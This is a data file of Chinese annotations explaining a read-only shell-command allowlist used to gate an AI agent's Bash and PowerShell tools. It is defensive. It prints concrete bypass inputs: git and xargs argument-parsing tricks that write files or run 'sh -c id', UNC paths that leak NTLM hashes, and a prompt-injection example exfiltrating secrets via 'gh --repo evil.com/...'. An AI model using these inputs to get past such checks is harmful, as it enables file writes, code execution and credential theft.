# -*- coding: utf-8 -*-
# src/utils/shell/readOnlyCommandValidation.ts 的中文批注数据
# 锚点均落在语句/条目收尾行，正文不含英文双引号与反斜杠

ANNOTATIONS = [
    (11, 'after', r'''本文件是「只读命令白名单」的共享数据库：把 git / gh / docker / rg / pyright 的每个子命令允许哪些标志、哪些参数形态、什么情况下必须判危险，全部写成可被 BashTool 与 PowerShellTool 共同 import 的声明式表。它只回答「这条命令按字面看是否写盘/发网络」，不做上下文判断；调用方负责 token 化与命令名归一。'''),

    (24, 'after', r'''`FlagArgType` 的六种参数类型是整套校验的语义基础。关键在 `none`：它声明「该标志不吃参数」。一旦真实程序认为它吃参数，校验器就会少消费一个 token，剩下的 token 被当成位置参数放行——这正是文件里反复出现的 parser differential（解析差）攻击的通用形态。所以这里每一种类型都必须与程序真实的 getopt 声明严格一致，宁可选更宽的 `string` 也不能错标成 `none`。'''),

    (37, 'after', r'''`ExternalCommandConfig` 三件套：`safeFlags` 是标志白名单；`additionalCommandIsDangerousCallback` 处理「标志都合法但组合起来危险」的情形（例如 `git tag foo` 创建标签）；`respectsDoubleDash` 声明该程序是否遵守 POSIX 的双短横线终止符约定。第三个字段常被忽略，但它是 pyright 那类「把双短横线当文件名」的工具的唯一防线。'''),

    (49, 'after', r'''引用选择标志组：只挑提交范围、不改仓库。抽成常量是为了让 `git log` / `git show` / `git rev-list` / `git stash list` 共享同一份定义，避免某处漏一个标志导致同一语义在不同子命令下判定不一致。'''),

    (70, 'after', r'''计数标志组 `--max-count` 与 `-n` 都声明为 `number`，不是 `none`——它们要吃一个数字。若误标 `none`，`git log -n --output=/tmp/x` 这类构造就会让校验器在 `-n` 处只前进一格，把后面整个标志当位置参数放过。'''),

    (101, 'after', r'''作者/提交者过滤组都被标成 `string`，因为它们的值可以任意，包括以 `-` 开头的字符串；下面的主循环对 `string` 有「值以 `-` 开头就拒绝」的兜底，唯一例外是 git 的反向排序键，所以这里不需要额外回调。'''),

    (159, 'after', r'''短标志区：`-M`/`-C`/`-B`/`-D`/`-l`/`-R` 全部是「开关型」，无参数。对照 `git log` 里的 `-S`：同样是单字母，但 `-S` 吃一个字符串。这种同字母异义正是必须逐子命令建表、不能建全局短标志表的原因。'''),

    (168, 'after_block', r'''这一段是本文件最贵的注释，记录了一次真实的任意文件写漏洞：`git diff -S -- --output=/tmp/pwned`。校验器原先把 `-S` 标成 `none`，于是只前进一格、随后在双短横线处 `break`，把 `--output=` 当作「双短横线之后的参数」完全不再检查；而 git 的 getopt 认为必需参数选项会无条件吞掉下一个 argv（在双短横线判定之前），于是 `--` 成了 pickaxe 的搜索串，`--output=` 变成真正的长选项——写任意文件。修法就是把 `-S`/`-G`/`-O` 改成 `string`，与 `git log` 处保持一致。'''),

    (173, 'after', r'''`git diff` 条目收尾。注意 `--relative` 是 `string`（可带路径），`--diff-filter` 也是 `string`（值是 A/M/D 组合），而 `--no-index` 虽是「比较任意两个文件」，仍只读——它不写盘，所以允许。'''),

    (224, 'after', r'''`git log` 的完整标志面。这里 `--pretty` / `--format` 是 `string`：它们能把内容格式化输出，但不落盘。真正的风险点是 `--output` 类选项从未被列入，配合上面的 `-S` 修正才闭环。'''),

    (247, 'after', r'''`git show` 与 log 高度重叠，但少了引用选择组（它只显示指定对象）。`-m` 用于合并提交分开展示，仍是纯读。'''),

    (277, 'after', r'''`git reflog` 的关键防线不在标志上，而在位置参数：裸 `git reflog` 与 `git reflog show` 只读，但 `git reflog expire` / `delete` / `exists` 会改写 `.git/logs/**`。由于它们不是标志，`validateFlags` 的位置参数兜底会直接放行，必须靠下面的回调拦。'''),

    (303, 'after', r'''回调只检查「第一个非标志位置参数」就返回：因为 reflog 的子命令语法里子命令必定是第一个位置参数，其后的都是引用名（`HEAD`、`refs/...`），把后面也当子命令查会误杀 `git reflog show main`。这是「只校验语法上唯一的危险槽位」的典型写法——比逐个 token 猜语义更不容易出错。'''),

    (311, 'after', r'''`git stash list` 只暴露展示类标志，`--max-count` 取自计数组。stash 的写操作（push/pop/apply/drop）根本没有条目，因此不需要回调兜底。'''),

    (331, 'before', r'''这里刻意不列 `--server-option` 与 `-o`，原因写在下方注释里：这两个选项会把任意字符串通过协议 v2 的能力公告发给远端，等于在一条「只读」命令上开了一个网络写原语。即使命令替换已被别处拦住，`--server-option=` 加上敏感值也足以把数据外泄到 `origin` 指向的任意服务器。只读路径永远不该具备网络写能力。'''),

    (340, 'after', r'''`git ls-remote` 条目收尾：它是唯一「只读但必须联网」的 git 子命令，所以除了过滤与排序标志，其余一律不放行。'''),

    (370, 'after', r'''`git status` 的 `-u` / `--untracked-files` 声明为 `string` 而非 `number`，因为它的合法值是 `no`/`normal`/`all` 这类枚举词，用 `number` 会把 `git status -u all` 判成缺参而误拒。宽松声明在这里是安全方向：值是枚举词，不可能变成危险标志。'''),

    (407, 'after', r'''`git blame` 的 `-L` 要一个行范围字符串（如 `1,20`），`--ignore-revs-file` 要一个文件路径——两者都只影响读哪些行，不产生写。'''),

    (450, 'after', r'''`git ls-files` 的排除模式组（`-x` / `-X` / `--exclude-from`）都是 `string`。`--recurse-submodules` 会进入子模块读取，仍属只读。'''),

    (471, 'after', r'''注意条目键是 `git config --get` 而非 `git config`：只把「读单个配置项」这个变体列入白名单，`git config key value`（写配置）与 `--unset` 等写变体都不存在条目，自然不会被匹配。这种「用更长的键名收窄语义」比在回调里判断子命令更可靠。'''),

    (488, 'after', r'''`git remote show` 必须排在 `git remote` 之前，否则前缀匹配会先命中短键。回调要求恰好一个位置参数且匹配 `[a-zA-Z0-9_-]+`——远程名里不允许点、斜杠、冒号，正是为了堵住把 URL 或 `host:path` 形态塞进远程名的外泄路径。'''),

    (502, 'after', r'''`git remote` 的回调反过来要求「不许有任何位置参数」：裸 `git remote` 与 `-v/--verbose` 只列远程，而 `git remote add/remove/set-url` 都会带位置参数，于是被这一条全覆盖。'''),

    (512, 'after', r'''`git merge-base` 找共同祖先，纯读。所有标志都是开关，没有位置参数校验：位置参数是提交引用，引用本身无法造成写入。'''),

    (538, 'after', r'''`git rev-parse` 是纯读的引用解析器，这里的重点是 `--short` 被标成 `string` 而不是 `number`——它既可以是开关也可以带 `=N` 长度，声明成 `string` 同时容纳两种形态，且值不会变成危险标志。'''),

    (574, 'after', r'''`git rev-list` 是提交枚举，标志面与 log 类似但少了展示补丁那部分。`--count` 只输出数量，是最常用的只读形态。'''),

    (594, 'after', r'''`git describe` 全部开关型，`--match`/`--exclude` 是 glob 字符串。`--dirty`/`--broken` 只是给输出加后缀，不改工作区——名字容易误解成写操作。'''),

    (610, 'after', r'''`git cat-file` 只留 `--batch-check`（对 stdin 上每个对象只打印类型和大小），刻意排除 `--batch`：后者会把对象**内容**整段吐出来，在管道里就能把敏感对象灌进后续命令。同一个标志的两个变体，信息暴露量差一个量级。'''),

    (627, 'after', r'''`git for-each-ref` 的过滤标志（`--contains`/`--merged`/`--points-at`）都是 `string`，值是提交引用。`--format` 用 `%(fieldname)` 占位符，只影响输出格式。'''),

    (689, 'after', r'''`git grep` 的标志面最宽：`-e` 取模式（`string`），上下文类 `-A`/`-B`/`-C` 取数字（`number`），匹配模式开关（`-E`/`-F`/`-P`/`-G`）全是 `none`。`-e` 是 `string` 这点很重要——如果标成 `none`，`git grep -e --output=x` 就会重演 `-S` 那套解析差。'''),

    (702, 'after', r'''`git stash show` 复用 diff 的标志组，只展示不应用。'''),

    (711, 'after', r'''`git worktree list` 里出现 `--expire` 是个可疑残留：`--expire` 属于 `git worktree prune`，`list` 并不接受它。它在这里的实际效果只是「遇到该标志时多消费一个 token」，既不会写盘也不会放过危险标志（后面没有其他可利用的槽位），但它说明「标志表是从邻近子命令抄来的」这一事实——抄错方向若反过来（把吃参数的标成不吃）就是漏洞。'''),

    (738, 'after_block', r'''`git tag` 的写入口是位置参数：`git tag foo` 会创建 `.git/refs/tags/foo`，`git tag foo <commit>` 还会让废弃提交重新可达。标志校验看不出这一点，必须由回调判定「位置参数前面有没有 `-l/--list`」。'''),

    (805, 'after', r'''回调里两个细节值钱：一是短标志 bundle（`-li`、`-il`）也要认成列表模式，用 `token.slice(1).includes('l')` 逐字符查，否则 `git tag -li pattern` 会被误判成创建标签；二是双短横线之后语义反转——`git tag -- -l` 不是列表，而是**创建**一个名字叫 `-l` 的标签，所以 `seenDashDash` 之后所有 token 一律按位置参数处理。'''),

    (824, 'before', r'''`git branch` 的 `--abbrev` 是双层防御的样板：git 用 PARSE_OPT_OPTARG 语义，只接受粘连形式 `--abbrev=N`，分离形式 `--abbrev N` 里的 N 会变成**分支名**（创建 refs/heads/N）。所以 `safeFlags` 里仍标 `number`（否则 `--abbrev=7` 会被误拒），同时在回调的 `flagsWithArgs` 里**故意删掉** `--abbrev`——回调因此把 N 看成「没有列表标志的位置参数」，判危险。单靠任何一层都不成立。'''),

    (921, 'after', r'''回调收尾：`lastFlagHasOptionalArg` 用来放行 `--merged`/`--no-merged` 后面可选的提交引用。这两个标志在 git 里参数可选，若当成必吃参数就会把 `<ref>` 跳过去、再把后面的真分支名当位置参数——所以它们放在 `flagsWithOptionalArgs` 而不是 `flagsWithArgs`。'''),

    (922, 'after', r'''`git branch` 条目结束，也是整张 git 表的最后一项。整张表没有「默认安全」的兜底：任何未列出的子命令（`git push`、`git commit`、`git checkout`…）都不会命中键，直接落到调用方的「不在白名单即需审批」。'''),

    (944, 'before', r'''`ghIsDangerousCallback` 防的是 DNS/HTTP 外泄：gh 的仓库参数接受 `[HOST/]OWNER/REPO` 三段式，带 HOST 时 gh 会连到那台主机的 API，于是一段被注入的提示就能让模型把密钥编进 OWNER 段发出去（`gh pr view 1 --repo evil.com/BASE32SECRET/x`），请求路径里就带着密文。位置参数形式的 URL 同理。'''),

    (982, 'after', r'''回调四条判据，顺序即优先级：含 `://` 判 URL；含 `@` 判 SSH 形态；`s` 出现 2 次以上判三段式（正常只有 OWNER/REPO 一个）；对以 `-` 开头的 token 先剥出 `=` 之后的值再判——`--repo=evil.com/x/y` 是单 token，不剥就等于完全跳过检查。最后一点是最容易被漏的：cobra 对 `--flag=val` 与 `--flag val` 等价，校验也必须等价。'''),

    (1245, 'after', r'''`gh search repos` 没有挂回调，因为它没有 `--repo`/`-R`——仓库只能通过 `--owner` 这种纯值过滤参数表达，构不成 HOST 外泄通道。gh 表里凡是带 `--repo`/`-R` 的条目一律挂同一个回调，这是「按危险槽位而不是按命令挂守卫」的分法。'''),

    (1380, 'after', r'''gh 表收尾。`gh auth status` 刻意排除 `--show-token`：它的作用就是把令牌打印出来，属于自我外泄；`gh release view`、`gh workflow view`、`gh search *` 系列则统一排除 `--web`/`-w`——那会拉起浏览器，把控制权交给用户侧的动作面。'''),

    (1410, 'after', r'''docker 只开 `logs` 与 `inspect` 两条读命令。`docker logs -f` 跟流、`inspect --format` 用模板取字段，都不改容器状态；`run`/`exec`/`build` 根本没有条目。'''),

    (1498, 'after', r'''ripgrep 表把 `--` 本身也写成 `none` 类型的安全标志。这看似多余（主循环本就会在 `--` 处 break），实际是为了让「`--` 出现在某个参数值位置」时也能被正确消费，而不是被当成待校验的未知标志拒绝。'''),

    (1507, 'after', r'''`respectsDoubleDash: false` 是 pyright 条目的核心。pyright 把 `--` 当文件名，其后的 token 仍按标志解析；若校验器在 `--` 处 break，`pyright -- --createstub os` 就会被自动放行，而 pyright 真的会创建 stub 文件（写盘）。这个字段就是为「不遵守 POSIX 约定的工具」准备的逃生门。'''),

    (1531, 'after', r'''pyright 回调只拦 `--watch`/`-w`：该模式会驻留监听文件变化，让一次「检查」变成长期进程，从而绕过工具调用的超时与收尾。'''),

    (1543, 'after', r'''`EXTERNAL_READONLY_COMMANDS` 只留 `docker ps` 与 `docker images`：这里要求的是「在 Windows 上 bash 与 PowerShell 里行为完全一致」的跨 shell 命令，任何 Unix 专有命令都归 BashTool 自己的表，不能混进来。'''),

    (1562, 'before', r'''`containsVulnerableUncPath` 只在 Windows 上生效：UNC 路径会触发 SMB/WebDAV 连接，Windows 在建立连接时会自动把当前用户的 NTLM 哈希发出去——一次 `ls` 或一次路径校验就能泄露凭据。函数对「路径或整条命令字符串」都做检测，因为它既用于参数校验也用于命令文本扫描。'''),

    (1575, 'after', r'''第一类：反斜杠 UNC。主机名的字符类刻意排除空白与两种路径分隔符，而不是只允许字母数字与点，是为了覆盖 Unicode 同形字与非常规字符——攻击者可以用形近字符构造能被系统解析、却不被朴素白名单认出的主机名。尾部同时接受两种分隔符，因为 Windows 对两者一视同仁。'''),

    (1587, 'after', r'''第二类：正斜杠 UNC，用负向后视 `(?<!:)` 排除 `https://`、`ftp://` 这类 URL——它们同样以双斜杠开头，但走的是浏览器/HTTP 栈而不是 SMB，不会自动附带凭据。副作用是该正则依赖后视支持，所以文件里对这条规则单独留了 lint 豁免。'''),

    (1597, 'after', r'''第三类：混合分隔符（一个正斜杠接两个及以上反斜杠）。这一条专门针对 bash 的转义处理：`/` 加两个反斜杠在 bash 里会变成 `/` 加一个反斜杠，到 Windows 侧就成了 UNC 路径。要求至少两个反斜杠，是因为单个反斜杠只是转义下一个字符，转完就是普通路径。'''),

    (1605, 'after', r'''第四类：反向混合（两个及以上反斜杠接一个正斜杠），同样是「转义处理后变成 UNC」的变体。这两条互为镜像，缺任何一条都能被另一种写法绕过。'''),

    (1611, 'after', r'''第五类：WebDAV 的 `@SSL@端口` 与 `@端口@SSL` 两种标记。它们让 Windows 的 WebDAV 重定向器去连非 445 端口，常被用来穿过只封了 SMB 的出网策略。'''),

    (1617, 'after', r'''第六类：`DavWWWRoot` 标记——Windows WebDAV 重定向器的固定挂载点名字，出现即说明走的是 WebDAV 而非 SMB。'''),

    (1635, 'after', r'''第七、八类是对 IPv4 与方括号 IPv6 字面量的**显式**检查。前六条正则理论上已能覆盖它们，这里仍单独列出，属于纵深防御：地址字面量是最容易被机器生成的形态，独立规则便于日后收紧（例如只允许私网段）而不牵动通用正则。'''),

    (1645, 'after', r'''`FLAG_PATTERN` 决定「什么样的 token 算标志」。它以 `-` 开头且紧跟字母/数字/下划线/连字符——注意它只锚定开头，所以 `-A20`、`--repo=x` 都算标志，而 `-`、`--` 单独出现不算（长度与字符都不满足），交给主循环的特判处理。'''),

    (1670, 'after', r'''`validateFlagArgument` 按类型判值，`none` 分支直接 `return false`——这是刻意的「不该被调用」断言：若调用方对 `none` 类型来取值，说明前面的分支已经错了，宁可判不安全。`char` 要求长度恰为 1（分隔符），`{}` 与 `EOF` 是字面量匹配（xargs 的 replace-str 与 heredoc 定界符）。'''),

    (1684, 'before', r'''`validateFlags` 是整条链的核心：从命令名之后开始走 token，逐个判「是不是合法标志、吃不吃参、参数值是否可接受」，任何一步不确定就返回 false。它的默认方向是「不认识 → 不安全」，所有宽松处理都必须写明白理由。'''),

    (1717, 'after', r'''xargs 特判：xargs 之后的第一个非标志 token 就是它要执行的**目标命令**，从那里起不该再由本表校验（目标命令有自己的白名单元数据）。若目标不在允许集合里，立即返回 false——这堵住了「用 xargs 把任意命令塞进一条看似只读的管道」的路径。'''),

    (1731, 'after', r'''双短横线处理分岔：`respectsDoubleDash !== false` 时在 `--` 处 break，其后全是位置参数（POSIX 约定）；否则把 `--` 当普通位置参数继续校验。默认值是 true，只有像 pyright 那样明确不吃这套的工具才需要显式关掉。'''),

    (1754, 'after', r'''这一段是 `hasEquals` 与 `inlineValue` 的拆分，修的是一个零权限 RCE：`xargs -E= EOF echo foo`。校验器若用「inlineValue 是否非空」来判断「有没有内联值」，`-E=` 的内联值是空串（falsy），于是转去吞下一个 token（`EOF`）当参数，接着把 `echo` 认成 xargs 目标命令并放行；而 GNU getopt 对短选项不剥 `=`，`-E=` 的参数就是 `=` 本身，`EOF` 成了目标命令——真的执行 `EOF`。修法：用「token 里是否含 `=`」判断，含则一律取内联值（哪怕是空串），不吞下一个 token。'''),

    (1768, 'after', r'''git 的 `-<数字>` 简写（`git log -5`）单独放行，等价于 `-n 5`。这条只在 commandName 为 git 时启用——同一个 `-5` 在别的命令里可能是未知标志，不能全局放宽。'''),

    (1794, 'after', r'''grep/rg 的粘连数字（`-A20`、`-B10`）在未知标志分支里单独处理：拆成前缀 `-A` 与后缀 `20`，只有前缀在表里且后缀是纯数字、且前缀类型为 `number` 或 `string` 时才放行。这比「整串不认识就拒绝」宽松一档，但限制了宽松的形态。'''),

    (1831, 'after', r'''短标志 bundle 的硬规则：**只要有一个成员吃参数，整串拒绝**。理由写在上面注释里——GNU getopt 的 bundle 语义是「吃参数的选项若在末尾且无后续字符，就吞下一个 argv」，于是 `xargs -rI echo sh -c id` 里的 `-I` 会吞掉 `echo` 作为 replace-str，真正执行的是 `sh -c id`；而校验器只按存在性检查 `-r` 与 `-I` 都在表里，然后前进一格，把 `echo` 当成安全目标命令放行。拒绝整串是保守方向，代价是用户必须写成 `-r -I {}`。'''),

    (1840, 'after', r'''`none` 类型却带了 `=`（如 `--color=`）一律拒绝。没有这条，`-FLAG=` 的内联值是空串，会从「构造值」分支溜过去，被当成合法的无值标志，从而与真实程序的解析产生错位。'''),

    (1861, 'after', r'''缺参判定：下一个 token 不存在，或它本身是个合法形态的标志，就判「缺参 → 不安全」。后半条尤其重要——它防止 `--output --help` 这种「本该吃参数却吃到另一个标志」的构造被当成合法，进而让真正的危险标志溜到后面被位置参数兜底放行。'''),

    (1879, 'after', r'''`string` 参数以 `-` 开头一律拒绝，唯一例外是 git 的反向排序键（`--sort=-refname`）。这条是纵深防御：某个标志若在真实程序里其实不吃参数，却被我们标成 `string`，攻击者就能把 `--dangerous-flag` 塞成它的值，让我们「合法消费」掉一个危险标志，而程序把那个 token 当自己的选项解析。'''),

    (1892, 'after', r'''非标志的位置参数一律放行（`i++`），这是整张表的既定假设：写操作若只能通过位置参数触发，必须由各条目的 `additionalCommandIsDangerousCallback` 拦（`git tag`、`git branch` 就是范例）；没有回调的条目，等于声明「这个子命令的位置参数不可能是写操作」。函数返回 true 不代表命令安全，只代表「标志这一层没发现问题」。'''),
]
